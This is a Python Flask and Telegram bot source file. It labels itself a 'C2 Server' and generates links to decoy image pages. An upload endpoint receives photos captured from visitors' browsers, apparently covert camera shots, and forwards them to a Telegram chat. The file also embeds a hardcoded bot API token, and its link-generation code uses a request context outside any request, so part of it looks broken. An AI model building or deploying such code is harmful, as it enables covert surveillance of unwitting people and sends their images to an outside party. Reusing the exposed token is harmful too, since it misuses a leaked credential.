import os
from flask import Flask, render_template, request, jsonify, send_from_directory
import telebot
API_TOKEN = "8661537357:AAF050il-maWYpmu6yjG66M9QBUEF5uXVdQ"
CHAT_ID = "8661537357"
# --- CONFIGURATION ---

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

# Folder to store the decoy images you upload
UPLOAD_FOLDER = 'static/decoys'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def home():
    return "C2 Server Active."

@app.route('/view/<image_id>')
def view_image(image_id):
    # This serves the page that the judges will see
    return render_template('index.html', image_id=image_id)

@app.route('/upload-capture', methods=['POST'])
def upload_capture():
    # Receives the 20 photos from the browser and sends them to you
    file = request.files['photo']
    bot.send_photo(CHAT_ID, file)
    return jsonify({"status": "received"})

# Simple bot polling to get the decoy photo you send
@bot.message_handler(content_types=['photo'])
def handle_decoy(message):
    file_info = bot.get_file(message.photo[-1].file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    file_name = f"{message.photo[-1].file_id}.jpg"
    with open(os.path.join(UPLOAD_FOLDER, file_name), 'wb') as new_file:
        new_file.write(downloaded_file)
    
    # Generate the link for the judges
    link = f"https://{request.host}/view/{message.photo[-1].file_id}"
    bot.reply_to(message, f"Link generated for demonstration:\n{link}")
if __name__ == "__main__":
    from threading import Thread
    # This line starts the bot in the background
    Thread(target=bot.infinity_polling).start()
    
    # This line starts the website (Render uses port 10000 by default)
    app.run(host='0.0.0.0', port=10000)
